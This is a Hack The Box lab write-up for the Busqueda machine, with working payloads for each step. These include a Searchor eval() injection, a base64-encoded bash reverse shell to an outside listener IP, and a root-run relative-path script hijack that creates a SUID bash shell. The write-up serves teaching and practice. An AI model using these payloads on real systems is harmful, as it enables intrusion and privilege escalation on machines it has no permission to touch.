# HTB: Busqueda — Writeup

**OS:** Linux
**Difficulty:** Easy
**Techniques:** Searchor eval() RCE (command injection), git config credential leak, password reuse, sudo script relative-path hijack

---

## Synopsis

Busqueda is an Easy Linux machine that runs a Flask "unified search" web app built on the **Searchor** Python library. The app uses a vulnerable version (2.4.0) that passes user input straight into `eval()`, giving arbitrary code execution and a reverse shell as `svc`. A `.git/config` left in the web root leaks Gitea credentials that are reused for SSH. Privilege escalation abuses a `sudo`-permitted root script (`system-checkup.py`) whose `full-checkup` action executes `./full-checkup.sh` by **relative path** — planting a malicious `full-checkup.sh` in a writable, executable directory and invoking the script from there runs arbitrary code as root.

## Skills Required

- Basic web enumeration and reading version banners
- Understanding Python `eval()` / injection and shell quoting
- Familiarity with `sudo -l` and Linux privilege escalation basics

## Skills Learned

- Identifying and exploiting an `eval()`-based command injection from a public advisory
- Proving an exploit locally in a venv before firing it at a target
- Dodging quote-hell with a base64-encoded reverse shell
- Finding credentials in a leftover `.git/config`
- Abusing a relative-path call in a root-run script, and why `/tmp` `noexec` forces the use of `/dev/shm`

---

## Enumeration

### Nmap

```
$ nmap -sCV -p- 10.129.102.182
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Only SSH and HTTP. Port 80 redirects to `searcher.htb`, so it's added to `/etc/hosts`:

```
$ echo '10.129.102.182  searcher.htb' | sudo tee -a /etc/hosts
```

### HTTP (80)

The site is a "Searchor"-branded unified search front end that builds search-engine URLs. While Nmap only reported Apache, the page itself advertises the component and version in its footer: **Searchor 2.4.0**.

![searcher.htb search app showing Searchor 2.4.0 in the footer](images/busqueda_searcher-version-footer.png)

A named component with an exact version is the lead. The app links to Searchor's GitHub, which carries a security advisory: versions **before 2.4.2** are vulnerable to arbitrary code execution through an unsafe `eval()` in the CLI's `search`. The fixing commit shows user input being concatenated into a Python expression and `eval()`'d:

![Searchor GitHub advisory/PR: eval() of user input removed in 2.4.2](images/busqueda_searchor-github-eval-advisory.png)

The vulnerable line:

```python
url = eval(
    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

The `query` value is substituted directly inside a single-quoted string that is then evaluated as code.

---

## Foothold

### Searchor 2.4.0 — eval() command injection

Because `query` is pasted into a string that `eval()` runs, closing the quote and injecting Python yields code execution. The mechanism was proven **locally first**, by installing the vulnerable version in a venv and attacking the CLI directly:

```
$ pip install searchor==2.4.0        # in a throwaway venv
$ searchor search GitHub "' + __import__('os').popen('id').read() + '"
https://www.github.com/search?q=uid%3D1000%28...%29%20gid%3D...
```

The `id` output appearing inside the generated URL confirms the breakout: the payload closes the string Searchor opened, concatenates the output of a shell command, and re-opens the string so the surrounding expression stays valid.

The web app exposes the same code path via `POST /search` with `engine` and `query` parameters, where `query` reaches the `eval()`. To avoid quote-nesting problems, the reverse shell is base64-encoded:

```
$ echo 'bash -i >& /dev/tcp/10.10.15.60/1337 0>&1' | base64 -w0
```

The injected `query` then runs `echo <b64> | base64 -d | bash`, wrapped in `__import__('os').system(...)`. Sent through the web form (URL-encoded exactly once), it fires against a waiting listener:

![Burp Repeater: query injection returns id output, showing RCE](images/busqueda_burp-eval-rce-id.png)

![Burp Repeater: the query payload must be URL-encoded (once) in the POST body](images/busqueda_burp-url-encoded-payload.png)

```
$ nc -lvnp 1337
...
svc@busqueda:~$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

A reverse shell as **svc**. `user.txt` is in svc's home.

`user.txt` retrieved.

---

## Lateral Movement

### Credential leak in .git/config → SSH

The web application lives in `/var/www/app` and contains a `.git` directory. Its config holds a remote URL with embedded credentials for the Gitea instance:

```
svc@busqueda:/var/www/app$ cat .git/config
[remote "origin"]
    url = http://cody:<password>@gitea.searcher.htb/cody/Searcher_site.git
```

Those credentials are reused for the `svc` user, giving a stable SSH session (and they are also svc's own password — password reuse is a recurring theme on this box):

```
$ ssh svc@searcher.htb
svc@busqueda:~$
```

---

## Privilege Escalation

### sudo system-checkup.py — relative-path script hijack

`svc` may run a root script with any argument:

```
svc@busqueda:~$ sudo -l
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script isn't readable by svc, so its behaviour is enumerated black-box. It offers three actions:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
     docker-ps      : List running docker containers
     docker-inspect : Inspect a certain docker container
     full-checkup   : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND   ...   PORTS                            NAMES
960873171e2e   gitea/gitea:latest   ...             127.0.0.1:3000->3000/tcp, ...   gitea
f84a6b33fb5a   mysql:8              ...             127.0.0.1:3306->3306/tcp         mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

`full-checkup` throws a *caught* generic error — a strong hint that it tries to run a helper file that doesn't exist in the current directory. The theory: the root script executes `./full-checkup.sh` by **relative path**, so it looks in whatever directory the script is launched from. svc can't write to `/opt/scripts`, but can create `full-checkup.sh` in a directory it controls and run the sudo command from there.

First, a proof of concept — a `full-checkup.sh` that simply drops a marker file, to confirm the script runs it as root:

```
svc@busqueda:/dev/shm$ cat full-checkup.sh
#!/bin/bash
touch ive_been_pwn3d.txt
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh
svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
svc@busqueda:/dev/shm$ ls -la ive_been_pwn3d.txt
-rw-r--r-- 1 root root 0 Nov 27 20:48 ive_been_pwn3d.txt
```

The marker file is owned by **root** — confirming the root-run script executed the attacker-controlled script from the current directory.

Swapping the payload for a SUID copy of bash then gives a root shell:

```
svc@busqueda:/dev/shm$ cat full-checkup.sh
#!/bin/bash
cp /bin/bash /tmp/dark
chmod 4777 /tmp/dark
svc@busqueda:/dev/shm$ chmod +x full-checkup.sh
svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
svc@busqueda:/dev/shm$ /tmp/dark -p
dark-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
```

The `-p` flag makes bash keep its effective UID (0), so `dark -p` is a root shell. (The first run didn't produce a working SUID binary; re-running the sudo command made `/tmp/dark` land correctly and `-p` then dropped to root — the exploit was a little finicky about timing/placement.) With that, the script's source can be read directly, confirming the bug — `full-checkup` invokes `./full-checkup.sh` with a relative path and no fixed working directory:

```
dark-5.1# cat /opt/scripts/system-checkup.py
```

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Nmap; `/etc/hosts` for `searcher.htb`; spotted Searchor 2.4.0 in the page footer |
| Foothold | Searchor 2.4.0 `eval()` command injection (proven locally, delivered via `POST /search`) → reverse shell as `svc` |
| Lateral Movement | Credentials leaked in `/var/www/app/.git/config`; password reuse → SSH as `svc` |
| PrivEsc | `sudo` `system-checkup.py full-checkup` runs `./full-checkup.sh` by relative path as root; planted script in `/dev/shm` (`/tmp` was `noexec`) → SUID bash → root |

---

## Lessons / Takeaways

- **Read the app's own version string.** Nmap stopped at "Apache", but the page footer named Searchor 2.4.0 — the whole foothold hangs off that one detail.
- **Prove the exploit locally first.** Installing Searchor 2.4.0 in a venv made the breakout a controlled experiment (`id` in the URL) instead of blind attempts against the box.
- **base64 beats quote-hell.** The injection string was already full of quotes; encoding the reverse shell removed all the nested-quote and redirection headaches.
- **`.git` directories leak secrets.** A `.git/config` remote URL with embedded credentials is a classic, and password reuse carried those creds to SSH and beyond.
- **Relative paths in root scripts are gold.** `./full-checkup.sh` trusts the current directory; controlling that directory controls what root runs.
- **Don't abandon a correct theory on the first failure.** The relative-path idea *was* right; the first attempt just didn't take, and a re-run of the sudo command made it work. It's worth retrying a sound exploit (and checking placement/timing) before pivoting to a longer path. `/dev/shm` is a reliable writable+executable working directory when a box's `/tmp` is mounted `noexec`, so it's a good default to reach for.
